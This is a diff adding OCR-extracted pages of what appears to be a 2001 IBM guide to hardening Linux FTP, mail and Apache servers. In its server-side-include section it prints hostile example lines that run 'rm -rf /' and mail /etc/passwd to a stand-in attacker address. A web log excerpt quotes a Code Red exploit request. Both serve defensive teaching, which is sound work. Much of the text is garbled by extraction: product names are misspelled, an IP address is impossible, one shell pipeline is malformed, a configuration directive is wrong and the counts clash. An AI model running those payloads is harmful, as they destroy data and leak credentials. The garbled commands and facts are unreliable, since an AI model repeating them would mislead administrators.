+    if ProFTPD is suitable for your requirements.
+
+
+    Another option to consider is SafeTP (http://www.cs.berkeley.edu/~smpecak/SafeTP/doc.html)
+    which provides a transparent FTP proxy. When SafeTP is installed, any Windows
+    or Linux Unix automatically becomes a Secure FTP client, without any further intervention.
+    SafeTP intercepts outgoing FTP network connections, and encrypts the traffic before
+    relating to the network. Details on how SafeTP is configured and any firewalls
+    should be investigated before deciding SafeTP as a FTP client/server solution
+    (http://www.cs.berkeley.edu/~smpecak/SafeTP/firewall.html).
+
+
+    # General FTP Server suggestions
+
+
+    +   - If possible, do not use standard FTP, but rather rsftp as mentioned above,
+    or if you need to just provide an anonymous server (without uploading privileges),
+    consider using a stand HTTP server, such as publicfile (http://publicfile.org)
+    or secured as VSFTPpd (described above), or Afpd (http://web.ranum.com/pubs/index.html).
+
+    - Combine your servers onto a single Linux server which is stripped of all non-FTP
+    functionality, services and data. This server should be placed in the DMZ, outside
+    of the corporate network. The FTP server(s) should ideally limit access to FTP
+    and administrative ports (such as SSH). It may also be beneficial to use TCP Wrappers
+    (see Wra at the end of this document) to wrap the FTP daemon with SSH.
+
+    - Create “captive accounts which restrict the users to only FTP access of the
+    system and restrict the users to only accessing directories above a root directory
+    you specify. One may implement this by creating a “guestgroup” entry in the /etc/ftpasswd
+    file.
+
+    - ftpmap and hosts.allow/deny can also be used to control access to FTP and other
+    xrelated services on your Linux server, but remember this control access over
+    the OSI stack, where the firewall control can operate at layer 2 and above.
+
+    - Secure against FTP bounce attacks. Although most current FTP servers protect
+    against this, it is still worth verifying. For an explanation of this exploit,
+    read http://www.securityfocus.com/archive/i3488 and the “-b ftp relay host” option
+    for nmap (found in the nmap man page, or http://www.insecure.org/nmap/nmap_epage.html).
+
+    - If using WU-FTP (included by many distributions, such as Red Hat), utilize the
+    “chroot” function to limit users access. To learn about chroot in wufpd, “man
+    ftpaccess” on your Linux system and read the “realizer”, “guest-user” and “guestgroup”
+    options.'
+  merge: -1
+  pgno: 30
+- img_proc: true
+  md: '# IBM
+
+
+    +   - Provide MD5 checksums and/or PGP signatures for the files that are to be
+    distributed via the FTP server, allow users a method for verifying the authenticity
+    of the files to be downloaded.
+
+    - Never allow FTP as root
+
+    - Modify the FTP information banner. On a client connection, FTP banners provide
+    FTP server information, as server type and version. This information can be used
+    to plan an attack against your system. Most FTP servers (wu-ftpd, proftpd, etc.)
+    allow this banner to be configured to provide different or limited messages to
+    the client.
+
+    - If the server is behind a firewall (recommended), test intrusions with Ftp-Ozone
+    (http://www.monkey.com/~dugsong/ftp-ozone.c)
+
+
+    # Linux Mail Servers
+
+
+    Mail servers are one of the most common components in a service provider architecture.
+    They are also one of the most common targets for Internet based attacks. As noted
+    in the SANS/FBI Vulnerability list, "Sendmail Vulnerabilities" holds the number
+    two slot on the exposure list. Sendmail is a program that sends, receives, and
+    forwards electronic mail processed on Unix and Linux computers. Due to Sendmail''s
+    longevity and omnipresence it is often targeted by attackers. Sendmail has its
+    share of vulnerabilities, in the very first advisory issued by CERT/CC in 1988,
+    reference to an exploitable vulnerability in Sendmail. In this section, we will
+    examine some practices for hardening Sendmail on Linux servers as well as other
+    mail server solutions for Linux, such as Postfix and Qmail. This section will
+    also explore using Linux servers as SPAM and Email Virus "filters.
+
+
+    # Sendmail
+
+
+    There are numerous resources documenting Sendmail security. Below are the best
+    practices to consider for general Sendmail on Linux implementations.
+
+
+    +   - First, upgrade to the latest version of Sendmail. Many, if not most, known
+    Sendmail security vulnerabilities are resolved by upgrading/patching to the latest
+    version. The latest version of the Open Source version of Sendmail can be found
+    specifically towards Service Providers found at: http://www.sendmail.com/solutions/sp/
+
+    - Run Sendmail as a separate user – don''t give Sendmail any privileges. Implement
+    this by making Sendmail UID/GID "mail." Using the RunAsUser directive in sendmail.
+    Additionally, by using the SafeFileEnvironment you can create "chroot jails" (which
+    prevents files from writing outside of a defined subtree). You will also need
+    to modify the permissions on the Sendmail related files to be accessed by user
+    "mail"
+
+
+    > ¹ If you are not familiar with Sendmail configuration ("m4" and "cf" are unfamiliar
+    to you), please read this document first: http://www.sendmail.com/m4/readme.html
+
+
+    © Copyright IBM. Corp. 2001. All rights reserved.'
+  merge: -1
+  pgno: 31
+- img_proc: true
+  md: 'Turn off SMTP Banner information. Like FTP banners explained above, when a
+    “user” telnets to your Sendmail server, they receive a banner of information about
+    Sendmail - below is an example:
+
+
+    This provides information that real users don''t care about, but could aid a potential
+    attacker in profiling your system. In Sendmail, a change to the sendmail.cf can
+    modify the SMTP banner information. The default setting in Red Hat distributions
+    is:
+
+
+    ```
+
+    # SMTP initial login message ($ e macro)
+
+    OSmtpGreetingMessage=$ Sendmail $v/$b
+
+    ```
+
+
+    This displays the information from the sample session above. By changing this
+    directive in sendmail.cf, you can change the information you present in your SMTP
+    banner, such as:
+
+
+    ```
+
+    # Modified SMTP login message ($e macro)
+
+    OSmtpGreetingMessage=$ Microsoft Exchange; $b
+
+    ```
+
+
+    After restarting Sendmail, when a “user” telnets to your Linux server, they''ll
+    receive:
+
+
+    > Obviously, this is an example of “masking” your server information.¹⁸
+
+
+    +   Turn off VRFY and EXPN. Most current distributions default to the following
+    PrivacyOptions configuration (in sendmail.cf).
+
+
+    +   # privacy flags
+
+    PrivacyOptions=+authwarnings,noverfy,noexpn,restrict
+
+
+    Disables VRFY and EXPN commands (among other things). Verify that your Linux mail
+    server is doing the same.
+
+
+    +   Consider running Sendmail from xinetd to accept mail on port 25 as non-root.
+    The following is an example smtp file you could include in /etc/sendmail/
+
+
+    ¹⁸ People often report to this type of “server masquerading” the OS by saying
+    that it is easily circumvented by nmap, or simple tool to identify the fingerprint.
+    However, if this sort of fingerprinting interests you, there are methods using
+    plugins for making your Linux server look like another OS (such as Windows). See
+    Bob Beck’s “Passive-Aggressive Resistance: OS Fingerprint Event”, Linux Journal,
+    #89, Sept. 2001. Also see http://www.insecure.org/nmap/nmap-fingerprinting-article.html
+    http://www.phrack.org/php?p=54-a-9'
+  merge: -1
+  pgno: 32
+- img_proc: true
+  md: "# IBM\n\n```\nservice smtp\n{\n    socket_type = stream\n    protocol = tcp\n\
+    \    wait = no\n    user = mail\n    group = mail\n    server = /usr/sbin/tcpd/sendmail\n\
+    \    server_args = -bs\n    nice = 0\n    instances = 20\n}\n```\n\nThis example\
+    \ runs Sendmail as user/group \"mail\" and is running Sendmail through tcp (TCP\
+    \ Wrappers). It also allows the control of number of Sendmail instances to run\
+    \ (20) and the \"nice\" value specifies the priority to run Sendmail (5).\n\n\
+    +   - As of Red Tail 7.1, by default, Sendmail does not accept network connections\
+    \ from any other than the local computer (this is a good thing in regards to default\
+    \ security). If you need to configure Sendmail as a server for other clients,\
+    \ edit /etc/sendmail.mc and change DAEMON_OPTIONS to also listen on network devices,\
+    \ or connect this other option. You will need to regenerate /etc/sendmail.cf by\
+    \ running.\n- Control Sendmail Denial of Service (DoS) attacks. An attack is to\
+    \ send so much mail to a server that the mail server's disk literally fills up\
+    \ the \"mail\" user/group. An easy way is to set quotas or limits which allows\
+    \ both (warm) and hard (stop) constraints on how many emails a given user can\
+    \ consume.\n- Disable Sendmail on Linux servers that are not mail servers or mail\
+    \ relays (see section above on disabling services for your distribution).\n- If\
+    \ you need to keep Sendmail enabled, the Linux server is not a mail server or\
+    \ relay, do not run Sendmail in daemon mode (disable the \"-bd\" switch).\n- More\
+    \ Sendmail recommendations can be found here: http://www.sendmail.org/net/000705securitygeneral.html\n\
+    \n# Postfix\n\nAlthough Sendmail is the MTA today, Postfix is a highly regarded\
+    \ alternative. Postfix (http://www.postfix.org) attempts to be fast, easy to administer,\
+    \ and secure, while at the same time being Sendmail compatible enough to not upset\
+    \ existing users. Thus, the outside has a \"Sendmail-ish\" flavor, but it is completely\
+    \ different. Postfix was developed by Wietse Venena at the IBM T. J. Watson Research\
+    \ Lab²⁰. It was formerly known as VMailer, and later released by the end of 1998\
+    \ as the IBM Mailer. From then it has been served as Postfix.\n\n> ¹⁹ http://www.linuxdoc.org/HOWTO/mini/Quota.html\n\
+    ²⁰ Wietse Venena is a security software developer and other of valuable tools\
+    \ such as TCP Wrapper and The Coroner's Toolkit. ftp/ftp.porcupine.org/pub/security/index.html"
+  merge: -1
+  pgno: 33
+- img_proc: true
+  md: 'Postfix was created with security as a main design goal. Essentially, Postfix
+    practices “rings of trust”, with separate processes interacting. Postfix is based
+    on “semi-resident, mutually-cooperating, processes” that perform specific tasks
+    for each other, without any particular parent-child relationship. Again, work
+    in separate processes gives better isolation than one big program (e.g. Sendmail).
+    Only one master process has to be run, and that process does not interact with
+    the Internet. Additionally, all the processes can be “chroot-ed”. The end result
+    of this type of distributed and isolated process architecture is that it creates
+    a much more difficult design to crash, as it requires multiple processes to compromise
+    a single monolithic program.
+
+
+    A recommended Postfix practices include:
+
+
+    +   - Utilize Postfix’s default_process_limit in main.cf to control resource usage.
+
+    - Consider changing the maildrop banner, setgroup (http://www.postfix.org/security.html
+    for details under “Set-uid” section)
+
+    - Configure SMTP banner, similar to Sendmail example given above. Use the smtpd_banner
+    directive in main.cf.
+
+
+    # Qmail
+
+
+    Qmail is a similar alternative to Sendmail, designed for security from the start,
+    and thus an Open Source competitor to Postfix. Qmail (http://cr.yp.to/qmail.html)
+    usage is growing at a very rapid pace. According to the author’s site, as of October
+    2001, more than 700,000 IP addresses are running as SMTP server. Some of the more
+    notable addresses using qmail as their SMTP server include: Yahoo!, NetZero, Address.com,
+    Onelist, and Critical Path.
+
+
+    Qmail author, Dan Bernstein, offered “security guarantee” in 1997 to prove qmail
+    was secure (http://cr.yp.to/qmail/guarantee.html). Although I don’t subscribe
+    to hackers optimism as often do, it illustrates the focus and confidence that
+    qmail and its developers have in terms of security design. For what it’s worth,
+    the prize for publishing an exploit in qmail unclaimed. The link above also includes
+    the author’s reasons for why qmail is secure and is definitely worth the read
+    if you are considering qmail as your server.
+
+
+    Some other qmail resources:
+
+
+    +   - There is a checklist for managing a large Sendmail site to qmail: http://cr.yp.to/sendmail.html.
+
+    - If you are using qmail for high volume sending, consider using the high concurrency
+    patch (http://mail.area.com/big-concurrency-patch), and the qmailqstat patch (http://mail.area.com/big-todo.103.patch).
+    You should also consider running multiple qmail server instances, depending on
+    your volume requirements and expectations.
+
+
+    > 21 For a Group at building a chroot-ed ‘cages’ with SSH, “Building a Secure
+    User Environment with SSH ChRoots” at: http://www.security.com/infocus/1404
+
+    22 Other sites using qmail can be found at http://mail.area.com/top.html.'
+  merge: -1
+  pgno: 34
+- img_proc: true
+  md: 'Qmailanalog (http://cr.yp.to/qmailanalog.html) is a collection of tools to
+    help you analyze qmail''s activity record (i.e., how many messages, recipients,
+    attempts, have were 50/75/100% of the messages delivered, etc.)
+
+
+    # ## Linux Virus and Spam Filters
+
+
+    A useful benefit to service provider email infrastructure is the ability to "pre-screen"
+    email for viruses, worms, Trojans, or Spam. By placing a Linux email filter around
+    the inbound and outbound SMTP servers, the service provider can add significant
+    value to their service agreements. Additionally, a Linux filter can be agnostic
+    to the sending and receiving email clients, allowing customers to use the email
+    system of their choice (i.e., Microsoft Outlook, Macintosh, Linux, etc.). Listed
+    below the diagram are a few examples of Open Source virus and spam filter applications.
+
+
+    The following is a high level example of integrating a Linux filter into an email
+    infrastructure. This could be implemented as a stand-alone Linux mail/filter server
+    (as illustrated), or possibly on the Linux firewall system (depending on the virus
+    scanner package).
+
+
+    ![](img/bfe6ea110ea710ed0e76c993ed104f90_35_0.png)
+
+
+    AMAVis (http://www.amavis.org/amavis.html) is a GPL application that resides on
+    the inbound SMTP server (i.e., Sendmail, Qmail, Postfix). When a mail arrives,
+    the message is parsed through a script that extracts all attachments from the
+    mail, unpacks (if needed) and scans them using a professional virus scanner program
+    (such as Network Associates Virus Scanner, Sophos Weep, CA IncludeIT.)
+
+
+    Qmail Scanner (http://qmail-scanner.sourceforge.net/) (also known as scan4virus)
+    is an add-on that enables a qmail server to scan all gateway-email for deat characteristics.
+    It is typically used for its anti-virus protection functions, in which it is used
+    in conjunction with commercial virus scanners. Qmail scanner also enables a site
+    (at a server/site level) to reach email that contains specific strings in particular
+    headers, or particular attachment files or types (e.g., *, vbs attachments).
+
+
+    Blackmail (http://www.jsm-net.demo.co.uk/blackmail/blackmail.html) is a Spam filter
+    that operates on incoming and (optionally) outgoing mail. The filtering consists
+    of'
+  merge: -1
+  pgno: 35
+- img_proc: true
+  md: "# IBM\n\nvarious checks on the SMTP envelope and message headers: if any fails\
+    \ then the mail will be bounced. Blackmail can check against Spam sites, keywords,\
+    \ host names and email addresses using DNS for validity, Blackhole lists, such\
+    \ as RBL, for IP addresses, validation against Spam signatures (like, that “To:”\
+    \ and “From:” addresses do not match), and validation of correct header information.\
+    \ 23\n\nJunkfilter (http://junkfilter.zer0.org/) is a Procmail-based filter system.\
+    \ Procmail is a popular and powerful mail-processing program for Linux and Unix\
+    \ systems. Junkfilter is under a BSD license (http://junkfilter.zer0.org/pkg/current/LICENSE).\
+    \ Junkfilter and Procmail offer highly configurable and flexible system for filtering\
+    \ spam. For example, I’ve seen Junkfilter used as an “auto-responder” to send\
+    \ bounces back to Spammers, making their attempted spam reach an invalid email\
+    \ (which many mail servers then process for removal).\n\nDeveloping a specific\
+    \ policy for email attachments should be part of your overall security management\
+    \ plan. For some suggestions on defining an email attachment security policy,\
+    \ see: http://www.advosys.com/tips/attachment-policy.html\n\n# Linux Web and Application\
+    \ Servers\n\nApache is a tremendously flexible web server. 24 In my years working\
+    \ with the Apache, I’ve seen it used in devices as small as a wrist watch, to\
+    \ the largest mainframe computers. Moreover, Apache is used in a multitude of\
+    \ application domains, and with the Rise of Web services, Apache as a services\
+    \ platform will become even more prevalent. This flexibility, evolution, and track\
+    \ record is why Apache owns the majority of the Web market share. It is why so\
+    \ important to take care in securing this crucial aspect of a Linux server infrastructure.\n\
+    \nFirst, it is important to understand how Apache runs and operates. Apache is\
+    \ typically bound to TCP port 80 (a default port for serving HTTP). When a service\
+    \ is run on port, it must be started as root or ports below 1023, the “Well Known\
+    \ Ports,” are considered privileged and thus has the ability to change the user\
+    \ of the forked http daemons. This is done by setting the “User” and “Group” names\
+    \ in the httpd config. The default configuration is User and Group “nobody”. The\
+    \ following shows the parent process started as root, and the forked http processes\
+    \ run as nobody, which handles the requests: \n\n```\n[root@mordor config#] ps\
+    \ -ef | grep http\nroot 5675 1 16:10 ? 00:00:00 /usr/local/apache/bin/httpd\n\
+    nobody 5676 5675 16:10 ? 00:00:00 /usr/local/apache/bin/httpd\n```\n\n23 Mail\
+    \ server administrators should have a solid understanding of SPAM related topics,\
+    \ and issues, such as relays and RBLs, for further information on these subjects,\
+    \ see: http://mail-abuse.org/rbl/. http://www.orbz.org, and http://www.spoptam.org/\n\
+    \n24 As IBM HTTP is built on Apache, comments about Apache configuration and operation\
+    \ can be applied to the HTTP Server as well.\n25 IANA port number document: http://www.iana.org/assignments/port-numbers"
+  merge: -1
+  pgno: 36
+- img_proc: true
+  md: '```
+
+    5677 5675 06 10 : 00:00:00/usr/local/apache/bin/httpd
+
+    5678 5675 06 10 : 00:00:00/usr/local/apache/bin/httpd
+
+    5679 5675 06 10 : 00:00:00/usr/local/apache/bin/httpd
+
+    5680 5675 06 10 : 00:00:00/usr/local/apache/bin/httpd
+
+    ```
+
+
+    As these users and groups are configured, many people will create a user or group
+    specifically for handling httpd processes (such as user "web”). Another way to
+    avoid starting the http process as root is to run Apache on a port above 1023
+    (many sites use port 8080, or 8888), which allows Apache to be started by a non-privileged
+    user. This scenario may be beneficial to service providers who want to grant their
+    customers the functionality to stop their Apache server processes without providing
+    the customer with root privileges.
+
+
+    # Apache Security Configuration Tips
+
+
+    As we saw above with the Group and directives
+
+
+    MaxAliveRequests limits the amount of requests can be sent over a single connection.
+    This is another method for controlling potential DoS attacks. Setting this parameter
+    higher increases performance, but also increases the potential for someone to
+    attempt a DoS. The default is 100, which I have found to be a nice median setting,
+    increase/decrease per your site requirements.
+
+
+    KeepAliveTimeout limits the number of seconds that Apache will wait for the next
+    request from the same client on the same connection. The default is 15, and can
+    be another useful configuration from closing those connections that an attacker
+    may be holding open for a DoS attempt.'
+  merge: -1
+  pgno: 37
+- img_proc: true
+  md: '# IBM
+
+
+    LimitRequestBody specifies the number of bytes from 0 (meaning unlimited) 2GB
+    that are allowed in a request body. The default value is defined by the compile-time
+    constant DEFAULT_LIMIT_REQUEST_BODY (0 as distributed). The LimitRequestBody directive
+    allows the user to set a limit on the allowed size of an HTTP request message
+    body within the context where the directive is given (server, per-directory, per-file
+    or per-location). If the client exceeds that limit, the server will return an
+    error response instead of servicing the request. The size of a normal request
+    message body will vary greatly depending on the nature of the resource and the
+    methods allowed on that resource. CGI scripts typically use the message body for
+    passing information to the server, so this directive can limit some scenarios
+    where an attacker attempts to DoS over overflow cgi data.
+
+
+    LimitRequestFields directive takes a number parameter as an integer from 0 (meaning
+    unlimited) to 32767. The default value is defined by the compile-time DEFAULT_LIMIT_REQUEST_FIELDS
+    (100 as distributed). The LimitRequestFields directive allows the server administrator
+    to modify the limit on number of request headers allowed in an HTTP request. A
+    server needs this to be larger than the number of fields that a normal client
+    might include. The number of request header fields used by a client rarely exceeds
+    20, but may vary among different client implementations, often depending on the
+    extent to which a user has configured their browser to support detailed content
+    negotiation. This directive can limit the exposure of headers to a Dos where an
+    attacker attempts to overflow a server with an abnormally long list of request
+    headers. Other limit directives include: LimitRequestSize which limits the size
+    of each request header; LimitRequestLine limits the length of each request line;
+    and LimitRequestBody (Apache 2) which limits the maximum byte size of an XML-based
+    request.
+
+
+    +   2. Limiting physical resources is another useful method for providing "backstops"
+    to Apache processes and applications for overwhelming your server. These are often
+    used as security harnesses to prevent attacks against your Web server from taking
+    the entire machine down. Apache::SizeLimit is a Perl module which allows you to
+    kill Apache processes if they grow too large. This can be a useful control on
+    Apache server to limit the potential for overwhelming a server from a runaway
+    process (either intentionally from an attack, or unintentionally from a bug or
+    memory leak). AtCoys we used this as a way to limit any process from dropping
+    the Linux server output. The following is how you would configure Apache:SizeLimit
+    in your httpd.conf:
+
+
+    ```
+
+    PerlFixHandler Apache::SizeLimit
+
+    <Per>
+
+    use Apache::SizeLimit;
+
+    # Max shared -- only kill processes that are truly using too physical RAM
+
+    ```
+
+
+    > 26 http://www.apache.org/perl5.6/lib/Apache/SizeLimit.html'
+  merge: -1
+  pgno: 38
+- img_proc: true
+  md: '```
+
+    $Apache:SizeLimit:MAX_UNSHARED_SIZE = 30000; # 30MB
+
+    # check the process size every other time the process checker is called
+
+    $Apache:SizeLimit:CHECK_EVERY_N_REQUESTS = 2;
+
+    </Perl>
+
+    ```
+
+
+    Other related modules include mod_throttle^27, Apache::Resource^28 and Randal
+    Schwartz''s Throttle module^29.
+
+
+    +   Server side includes (SSI) is a powerful way to include dynamic content in
+    a Web page, as displaying the current date and time, and as the following server
+    side include embedded in a Web page:
+
+
+    ```
+
+    <!--#exec cmd="date +%x"-->
+
+    ```
+
+
+    This would output to the Web page:
+
+
+    11/16/2001
+
+
+    Without the proper security, SSI allows enables subjective Linux programs to be
+    invoked from a Web page - exposing a host of security risks. If SSI is not necessary
+    for your site, you can specify:
+
+
+    Options None
+
+
+    This directive will disable all “Options” from the container it is specified within.
+    If SSI functionality is required, it is strongly recommended to disallow execution
+    of CGI scripts through SSI:
+
+
+    Options IncludesNOEXEC
+
+
+    Which would server side includes, but disables execution of programs through #exec
+    or #include. Why bother? Two reasons. The first is that it can be a tremendous
+    security risk, such as:
+
+
+    ```
+
+    <!--#exec cmd="rm -rf /"-->
+
+    <!--#exec cmd="mail badguy@badguysite.org | cat /etc/passwd"-->
+
+    ```
+
+
+    Obviously, these are very malicious side includes, but could be permitted if SSI
+    and CGI security is not properly configured in your server. The second reason
+    is that there are a variety of more secure and efficient ways to provide dynamic
+    content to a Web page, such as using a protected CGI, a PHP program, or a Java
+    application.
+
+
+    +   Apache provides a convenient tool for easily applying per directory, called
+    been. An “htaccess” is a file containing Apache configuration directives. Those
+    directives apply to everything in the directory
+
+
+    > ^27 http://www.snert.com/Software/mod_throttle/
+
+    28 http://www.perldec.com/perl5.6/lib/Apache/Resource.html
+
+    29 http://www.stonehenge.com/merlyn/LinuxMag/col17.html'
+  merge: -1
+  pgno: 39
+- img_proc: true
+  md: 'the .htaccess file is located, including sub-directories. Using .htaccess files
+    are very useful in a service provider environment where it is often desirable
+    to define per-directory access and privileges to different users and customers.
+    Ken Coar has written a useful tutorial on using htaccess (http://apache-server.com/tutorials/ATusing-htaccess.html).
+
+
+    It is important to implement htaccess securely. The directive below, which would
+    be included in httpd.conf, illustrates how to ensure the .htaccess file itself
+    is never served by Apache – using the Files directive, which ensures that a request
+    for any file named .htaccess is denied.
+
+
+    ```
+
+    <Files .htaccess>
+
+    Order allow,deny
+
+    Deny from all
+
+    </Files>
+
+    ```
+
+
+    This next directive, which would be included in the .htaccess file, shows how
+    to limit a directory to only allowing POST by the group "staff" (other methods,
+    such as GET, would still be allowed to unauthenticated users):
+
+
+    ```
+
+    AuthName "Restrict POSTs"
+
+    AuthType Basic
+
+    AuthUserFile /etc/httpd/users
+
+    ```
+
+
+    ```
+
+    <Limit POST>
+
+    require group staff
+
+    </Limit>
+
+    ```
+
+
+    An alternative to using htaccess for this type of authentication is to include
+    a configuration in the httpd.conf, which could be considered easier to manage
+    and secure (single point of configuration, and the httpd.conf file is writable
+    by a privileged user):
+
+
+    ```
+
+    <Directory /usr/local/apache/htdocs/customer_a_dir>
+
+    AuthType Basic
+
+    AuthName "Customer A"
+
+    AuthUserFile /usr/local/apache/all_customers/customer_a_dir.htpasswd
+
+    require valid-user
+
+    </Directory>
+
+    ```
+
+
+    This would cause a request to http://yourdomain.com/customer_a_dir/ to be prompted
+    for password authentication. If the user/password did not match against the "customer_a_dir.htpasswd"
+    file specified in AuthUserFile, the request would be denied.
+
+
+    Depending on the requirements and flexibility of your customer, htaccess and htpasswd
+    authentication can provide an early and useful mechanism for a variety of HTTP
+    based authentication schemes in a service provider environment.
+
+
+    +   5. Apache Suezec provides the ability to use CGI and SSI programs under user
+    IDs different from the user ID of the calling Apache Web server. This functionality'
+  merge: -1
+  pgno: 40
+- img_proc: true
+  md: 'can be very useful in multi-user environments found in service provider infrastructures.
+    Suexec is based on a set-ID "wrapper" program that is called by the main Apache
+    Web server. This wrapper is called when an HTTP request is made for a CGI or SSI
+    program that the administrator has configured to execute as a user other than
+    that of the main server. When such a request is made, Apache provides the suexec
+    wrapper with the program''s name and the user group IDs which the program is to
+    execute. For a step-by-step description of the suexec security model, as well
+    as detailed installation and configuration instructions, see: http://http.apache.org/docs/suexec.html
+
+
+    +   Keep your server info and status secure. Server-info and server-status are
+    two commonly used Apache modules for providing detailed information about Apache''s
+    server configuration and process state. It''s important that you secure who is
+    able to view this information. The following directives would be used in an httpd.conf
+    (if server-info and status are active in your server). The first directive allows
+    for server-info from "yourdomain.com" – this could also be a specific IP address.
+    The second directive for server-status limits requests to the localhost only.
+
+
+    ```
+
+    <Location /server-info>
+
+    SetHandler server-info
+
+    Order deny,allow
+
+    Deny from all
+
+    Allow from .yourdomain.com
+
+    </Location>
+
+    ```
+
+
+    ```
+
+    <Location /server-status>
+
+    SetHandler server-status
+
+    Order deny,allow
+
+    Deny from all
+
+    Allow from localhost
+
+    </Location>
+
+    ```
+
+
+    +   Restrict file system access. Make users cannot "walk" your file system. The
+    first directive, which would be included in httpd.conf, blocks access to the root
+    directory.
+
+
+    ```
+
+    <Directory />
+
+    Order Deny,Allow
+
+    Deny from all
+
+    </Directory>
+
+    ```
+
+
+    The next directive handles the same type of scenario described above, but through
+    the UserDir directive. For example, "UserDir /" would map a request for http://yourdomain.com/~root
+    to the "/", or root directory. To prevent this, specify the following in your
+    httpd.conf:
+
+
+    UserDir disabled root'
+  merge: -1
+  pgno: 41
+- img_proc: true
+  md: '# IBM diagnosis
+
+
+    # Web server diagnosis
+
+
+    Although all have sophisticated tools which alert you to our wireless device jour
+    when someone attempts malicious against our Web server, it is more likely that
+    you or your customer will need to do real time analysis when system resources
+    become suspect. Here are a few command line analysis tools to look for suspicious
+    activities in your Web or Application server logs.
+
+
+    The Code Red word didn''t infect Linux servers, but it threw large amounts of
+    requests against all servers as the word spread across the Internet. This, of
+    course, enters into performance and system resource (disk) issues as Web servers
+    get bombarded with request for Windows-based files to export, such as "default.ida".
+
+
+    The typical Code Red looked similar to this:
+
+
+    ```
+
+    192.168.2.12 - [19/Jul/2001:16:55:47 +0000] "GET /default.ida?NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN090%u683%uc3%u781%u9090%u683%u658%bd3%u781%u9090%u658%bd3%u781%u9090%u683%u819%u0c3%u553%uu077%%0000%0000=a
+    HTTP/1.0 400 252
+
+    ```
+
+
+    To do a quick run-check of a Web server log, simply grep log for a specific string,
+    such as "default.ida" and count the number of lines in which it appears:
+
+
+    ```
+
+    [root@fangong logs]$# grep ''default.ida'' access_log | wc -l
+
+    309569
+
+    ```
+
+
+    As you can tell, this request had over 300,000 requests for "default.ida" and
+    was getting hit hard by Code Red (but a Linux server, and the attack being Windows-based,
+    the system was not infected and therefore we don''t need to lose any data or other
+    system corruption). But since we are using Apache, we don''t need to waste cycles
+    and disk space for all of these Code Red word requests – or by using the "SetEnv"30
+    directive in the Web server''s httpd.conf and restarting the server, Apache can
+    simply ignore any requests matching the specified string in the requested URI:
+
+
+    # Make sure you comment this
+
+    #CustomLog /usr/local/apache/logs/access_log
+
+
+    SetEnv Request_URI "^.root.exe%cmb.default.ida" bad-req
+
+    CustomLog /usr/local/apache/logs/access_log common env=bad-req
+
+
+    This will configure Apache to ignore any requests that match the SetEnv Request_URI
+    string, in class "root.exe" "cmb.exe", or "default.ida" (all HTTP requests attempting
+    to exploit vulnerabilities) and all other "normal" HTTP requests to be logged.
+    So for a request http://www.mysite.com/default.ida or
+
+
+    > 30 http://http.apache.org/docs/mod_setenv.html#SetEnv'
+  merge: -1
+  pgno: 42
+- img_proc: true
+  md: '# # IBM
+
+
+    http://www.mysite.com/summary/root exe will get infected and will not appear in
+    the log files.
+
+
+    Often, robots, crawlers, or worms will bring Web servers down, or at least hindering
+    repeated requests for the same document. This is also a very common and low-brow
+    "script kiddie"31 attempt at a denial of service attack^32. However, you may not
+    know how to search for a specific string, such as "default.ida", to identify if
+    this is the cause of your problems, or how to defend against it. The following
+    is a series of commands piped together to grab a chunk of the log (you can specify
+    the amount of lines you want to take "tail" back from the end of file), cut out
+    the appropriate fields from each line (using f1 and f2 - f6) would be useful to
+    match against the registering URL, or if your server is logging requests, and
+    sort each entry and provide a count of identical lines.
+
+
+    ```
+
+    [treebeard@fandom log] sort -t1000 -access_log | cut -d"" -f1,2 | sort | uniq
+    -c | sort -n
+
+    ```
+
+
+    ```
+
+    [...
+
+    35 19.48.93 - [09/Oct/2001:13:56:48-0700]"GET /index.html HTTP/1.1
+
+    76 18.196.5.19 - [09/Oct/2001:13:56:30-0700]"GET /index/ /linux/sec/overview.html
+    HTTP/1.1
+
+    137 156.153.255.252-44 - [09/Oct/2001:13:56:42-0700]"GET /index/ /linux/howtos/index.html
+    HTTP/1.1
+
+    139 64.78.183.31 - [09/Oct/2001:13:56:29-0700]"GET /index/ /linux/index.html HTTP/1.1
+
+    123 204.476.138.11 - [09/Oct/2001:13:56:34-0700]"GET /private/mydir/index.html
+    HTTP/1.1
+
+    ```
+
+
+    As the last lines indicate, there were 1,223 requests for "private/mydir/index.html"
+    from the IP address 204.476.138.11 – all in just 1 second (13:56:34). This clearly
+    illustrates an attempted, script attack against this Web server (or, at least,
+    a misconfigured Web server). From here, we could closely monitor the IP address
+    which is repeating requests for this directory path and either contact them or
+    enact defenses against their requests (ranging from ignoring their requests, such
+    as the "SetEnv" example, by blocking this at the border router or firewall).
+
+
+    # Web Services
+
+
+    It is very likely that Web services will increase the range and effectiveness
+    of service providers, and possibly create new service market outlets. By the rapid
+    adoption of Web services, it is critical to fasten these technologies into your
+    Linux Web and Application security plan. In fact, one of the key technologies
+    at the core of Web services, SOAP, is designed to utilize HTTP as its transport
+    in an order to overcome some of the previous issues with other RPC protocols such
+    as DCOM and CORBA (such using tunneling forwards).
+
+
+    However, SOAP does not implement any security features in its current implementation,
+    which leaves this for later users. The initial reaction is to send SOAP messages
+    inside SSL or IPSec implementation, providing a secure channel. This transport
+    (SSL) and network (IPSec) security, but not application level security
+
+
+    > 31 http://www.tuxedo.org/~esr-jargon/html/entry/script-kiddies.html
+
+
+    > 32 This paper does not discuss denial of service – although I am working on
+    a shorter, companion document covering this. An overview white paper on Do and
+    DDoS attacks can be found here: http://www-3.ibm.com/security/wp_denial.shtml.'
+  merge: -1
+  pgno: 43
+- img_proc: true
+  md: 'as the end-result to the application is still a SOAP message. Since the transport
+    and
+
+    layer service is finished at this stage, this leaves the application with no ability
+
+    to control the security policy or actions of the layers underneath. There are
+    also
+
+    shortcomings with end-to-end and persistence in the SOAP over SSL or IPSec security
+
+    model. To address some of these concerns, there is a SOAP extension using
+
+    digital signatures, currently under consideration by the W3C
+
+    (http://www.w3.org/TR/SOAP-dig/).³³
+
+
+    In the meantime, if your customer needs to implement SOAP in their Linux server
+
+    environment, consider some of the following issues:
+
+
+    +   - SOAP is not relegated to HTTP port 80. Isolate your service specific used
+    for that purpose -- allows for easier firewalling and
+
+    . Use the "Listen", "Port", and/or the "VirtualHost" Apache
+
+    configuration directives to configure the SOAP server for a distinct port. If\possible,
+    configure a distinct domain as well as a unique port number to
+
+    Web services.
+
+    - Use SSL to encrypt the Web services data through that port. From the SOAP
+
